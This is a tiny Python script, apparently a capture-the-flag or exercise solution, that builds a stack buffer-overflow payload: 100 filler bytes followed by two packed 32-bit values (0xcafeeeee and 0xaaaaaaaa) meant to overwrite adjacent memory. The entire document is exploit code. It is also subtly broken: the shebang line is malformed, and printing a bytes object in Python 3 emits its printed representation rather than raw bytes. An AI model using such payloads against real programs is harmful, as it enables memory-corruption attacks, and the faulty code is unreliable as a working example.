#/usr/bin/python3
import struct

print(b"a"*100+struct.pack("I",0xcafeeeee)+struct.pack("I",0xaaaaaaaa))